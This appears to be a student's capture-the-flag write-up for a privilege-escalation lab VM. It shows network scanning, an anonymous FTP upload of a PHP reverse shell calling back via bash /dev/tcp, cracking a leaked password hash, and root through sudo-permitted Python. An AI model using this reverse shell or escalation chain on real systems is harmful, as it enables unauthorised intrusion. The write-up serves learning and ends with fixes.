# Local

### Objective
In this project I learned about Privilege escalation. 
I had given a VM called 01-Local.ova and assiment is to get root access of the machine.
In following README.md I will document my steps to get root access of the machine.

### Setup
- Download & install [VirutalBox](https://www.virtualbox.org/)
- Download & open [Kali Linux](https://www.kali.org/) in VirtualBox.

*I used a pre-built kali linux VM for this project and opened my network for vm to vm communication.*

- Download [01-Local.ova](https://assets.01-edu.org/cybersecurity/local/01-Local.ova) and open it in VirtualBox.

*I encountered an issue with the VM not booting up, so i had to change the network adapter settings. You may encounter a smilar issue. Giving VM a network access was crusial for the nature of this assigment.*

## Getting into root
#### 1. In the assignment there was a clue about a hidden IP address. I used [arp-scan](https://www.kali.org/tools/arp-scan/) to scan for local ip addresses.
```
$ sudo arp-scan --localnet 
[sudo] password for kali: 
Interface: eth0, type: EN10MB, MAC: 08:00:27:d2:26:79, IPv4: 192.168.1.124
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.1.1     00:22:07:6b:0f:63       (Unknown)
192.168.1.182   e0:0a:f6:5a:ef:db       (Unknown)
192.168.1.209   08:00:27:b3:fe:4c       (Unknown)

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.831 seconds (139.81 hosts/sec). 3 responded
```

By trial and error I determened that the IP address of 01-Local must be 192.168.1.209.

*Side note - If you copy the IP address to your browser you will see this fun little message:*

![greetings](/pic/greetings.png)




#### 2. In previous assingment [active](https://github.com/01-edu/public/tree/master/subjects/cybersecurity/active) I learned about [nmap](https://nmap.org/). I used nmap to scan the open ports of the machine.
```
$ nmap -p- -T4 192.168.1.209
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-15 09:00 EDT
Nmap scan report for ubuntu.lan (192.168.1.209)
Host is up (0.000087s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 1.05 seconds
```
Because i had the IP address of the machine, i could use nmap to scan the open ports of the machine. I found that the machine had open ports 21, 22 and 80.

Port description:
- Port 21 is primarily used as the control port for FTP, managing the commands and operations of the file transfer process, while actual data is transferred over a separate data connection.
- Port 22 is used for SSH (Secure Shell) which is a cryptographic network protocol for operating network services securely over an unsecured network.
- Port 80 is used for HTTP (Hypertext Transfer Protocol) which is the foundation of data communication for the World Wide Web.



#### 3. File Trasfer
Because the machine had an open FTP port, I used [Metasploit-framework](https://www.kali.org/docs/tools/starting-metasploit-framework-in-kali/) to try to find something.

```
msf6 > dirb http://192.168.1.209/
[*] exec: dirb http://192.168.1.209/


-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Aug 15 10:08:23 2024
URL_BASE: http://192.168.1.209/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
                                                                                                                                                           
-----------------                                                                                                                                          
                                                                                                                                                           
GENERATED WORDS: 4612                                                                                                                                      
                                                                                                                                                           
---- Scanning URL: http://192.168.1.209/ ----                                                                                                              
==> DIRECTORY: http://192.168.1.209/files/                                                                                                                 
+ http://192.168.1.209/index.html (CODE:200|SIZE:321)                                                                                                      
+ http://192.168.1.209/server-status (CODE:403|SIZE:278)                                                                                                   
                                                                                                                                                           
---- Entering directory: http://192.168.1.209/files/ ----                                                                                                  
(!) WARNING: Directory IS LISTABLE. No need to scan it.                                                                                                    
    (Use mode '-w' if you want to scan it anyway)                                                                                                          
                                                                                                                                                           
-----------------                                                                                                                                          
END_TIME: Thu Aug 15 10:08:24 2024                                                                                                                         
DOWNLOADED: 4612 - FOUND: 2     
```

I found a directory called **/files**.

*If you add /files at the end of the IP address in browser address bar you will see a list of files on the machine.*

![files](/pic/files.png)


**Trying to send a test file via ftp**

Because anonymous login was allowed, I tried to send a file to the machine via ftp using anonymous credentials.

```
ftp 192.168.1.209
Connected to 192.168.1.209.
220 ProFTPD Server (ProFTPD Default Installation) [192.168.1.209]
Name (192.168.1.209:ingvar): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> put HelloWorld.html 
local: HelloWorld.html remote: HelloWorld.html
229 Entering Extended Passive Mode (|||62549|)
150 Opening BINARY mode data connection for HelloWorld.html
100% |**********************************************************************************************************************************************************************************|   227        4.41 MiB/s    00:00 ETA
226 Transfer complete
227 bytes sent in 00:00 (262.34 KiB/s)
```

Transfer was successful. I could see the file in the /files directory.

![hello](/pic/Hello.png)

#### 4. Getting root access via reverse shell

I now had access to the machine via ftp, but still needed access to the root. 

I did some reading and found reverse shell. A reverse shell is a method of gaining remote command-line access to a target machine by having that machine connect back to the attacker's machine. It is a common technique in both legitimate penetration testing and malicious hacking and is favored because it can bypass many firewall restrictions that block incoming connections.

Now that I knew reverse shell was possible, I created a reverse shell script using the almighty internet and uploaded it to the machine.

```
<?php
$ip = '192.168.1.182';  // Attackers IP (yours)
$port = 1234;       // Change this to the desired port number
$shell = "/bin/bash -c 'bash -i >& /dev/tcp/{$ip}/{$port} 0>&1'";
exec($shell);
echo "Reverse shell completed";
?>
```

I saved the file as **/scripts/reverse_shell.php** and uploaded it to the machine.

```
ftp> put reverse_shell.php 
local: reverse_shell.php remote: reverse_shell.php
229 Entering Extended Passive Mode (|||8530|)
150 Opening BINARY mode data connection for reverse_shell.php
100% |**********************************************************************************************************************************************************************************|   125        3.31 MiB/s    00:00 ETA
226 Transfer complete
125 bytes sent in 00:00 (395.04 KiB/s)
ftp> 
```

I used [netcat](https://www.kali.org/docs/tools/starting-netcat-in-kali/) to listen for the reverse shell.

```nc -lvnp 1234```

And then I executed the reverse shell script on the machine by visiting the file in the browser.

Now I got the access to machine directory.

After browsing the VM directories I found a file called **important.txt** in /home directory.

```
www-data@ubuntu:/home$ cat important.txt
cat important.txt
  /$$$$$$    /$$     
 /$$$_  $$ /$$$$    
| $$$$\ $$|_  $$     
| $$ $$ $$  | $$    
| $$\ $$$$  | $$    
| $$ \ $$$  | $$    
|  $$$$$$/ /$$$$$$  
 \______/ |______/                                                                           
                                                                           
                                                                           
 /$$                                     /$$   /$$ /$$     /$$             
| $$                                    | $$  / $$/ $$   /$$$$             
| $$        /$$$$$$   /$$$$$$$  /$$$$$$ | $$ /$$$$$$$$$$|_  $$             
| $$       /$$__  $$ /$$_____/ |____  $$| $$|   $$  $$_/  | $$             
| $$      | $$  \ $$| $$        /$$$$$$$| $$ /$$$$$$$$$$  | $$             
| $$      | $$  | $$| $$       /$$__  $$| $$|_  $$  $$_/  | $$             
| $$$$$$$$|  $$$$$$/|  $$$$$$$|  $$$$$$$| $$  | $$| $$   /$$$$$$           
|________/ \______/  \_______/ \_______/|__/  |__/|__/  |______/           
                                                                           
                                                                           
run the script to see the data

/.runme.sh
```

cat important.txt gave me a hint to run the script **.runme.sh**.

```
www-data@ubuntu:/home$ cat /.runme.sh
cat /.runme.sh
#!/bin/bash
echo 'the secret key'
sleep 2
echo 'is'
sleep 2
echo 'trolled'
sleep 2
echo 'hacking computer in 3 seconds...'
sleep 1
echo 'hacking computer in 2 seconds...'
sleep 1
echo 'hacking computer in 1 seconds...'
echo "hahaahahah it's a joke, Don't be stupid, read scripts before running it"
exit 01 ### eeeeeemmmmmmmmmmmmm
sleep 1
echo '⡴⠑⡄⠀⠀⠀⠀⠀⠀⠀ ⣀⣀⣤⣤⣤⣀⡀
⠸⡇⠀⠿⡀⠀⠀⠀⣀⡴⢿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀
⠀⠀⠀⠀⠑⢄⣠⠾⠁⣀⣄⡈⠙⣿⣿⣿⣿⣿⣿⣿⣿⣆
⠀⠀⠀⠀⢀⡀⠁⠀⠀⠈⠙⠛⠂⠈⣿⣿⣿⣿⣿⠿⡿⢿⣆
⠀⠀⠀⢀⡾⣁⣀⠀⠴⠂⠙⣗⡀⠀⢻⣿⣿⠭⢤⣴⣦⣤⣹⠀⠀⠀⢀⢴⣶⣆
⠀⠀⢀⣾⣿⣿⣿⣷⣮⣽⣾⣿⣥⣴⣿⣿⡿⢂⠔⢚⡿⢿⣿⣦⣴⣾⠸⣼⡿
⠀⢀⡞⠁⠙⠻⠿⠟⠉⠀⠛⢹⣿⣿⣿⣿⣿⣌⢤⣼⣿⣾⣿⡟⠉
⠀⣾⣷⣶⠇⠀⠀⣤⣄⣀⡀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠀⠉⠈⠉⠀⠀⢦⡈⢻⣿⣿⣿⣶⣶⣶⣶⣤⣽⡹⣿⣿⣿⣿⡇
⠀⠀⠀⠀⠀⠀⠀⠉⠲⣽⡻⢿⣿⣿⣿⣿⣿⣿⣷⣜⣿⣿⣿⡇
⠀⠀ ⠀⠀⠀⠀⠀⢸⣿⣿⣷⣶⣮⣭⣽⣿⣿⣿⣿⣿⣿⣿⠇
⠀⠀⠀⠀⠀⠀⣀⣀⣈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇
⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    shrek:061fe5e7b95d5f98208d7bc89ed2d569'
www-data@ubuntu:/home$ 
```


I ran the script and got the secret key.



Using [hashes](https://hashes.com/en/decrypt/hash) I decrypted the hash and got the password **youaresmart**.

#### 5. Capture the flag

I used the password to login as **shrek** and looked for the flag. I found an file called user and there was some cool ascii art but no flag. 

![ascii](/pic/ascii.png)

Also tried to access /root directory but got Permission denied. 
Checked for privalages and got:

![python](/pic/python.png)

Seems like I can run python 3.5 as root. I created a python script to get root access.

```
import os;os.system('/bin/bash')
```

Then uploaded the script via ftp and ran it.

```
sudo python3.5 python_script.py
```

Now I had root access and could access the flag.

![flag](/pic/flag.png)

### How to fix the vulnerability:
- Disable anonymous login for FTP or close the port 21 if not needed.
- Restrict sudo access to only necessary users.
- Do not store important information in easily accessible directories.

## Task Documentation
- [Task Description](https://github.com/01-edu/public/tree/master/subjects/cybersecurity/local)
- [Audit Questions](https://github.com/01-edu/public/tree/master/subjects/cybersecurity/local/audit)
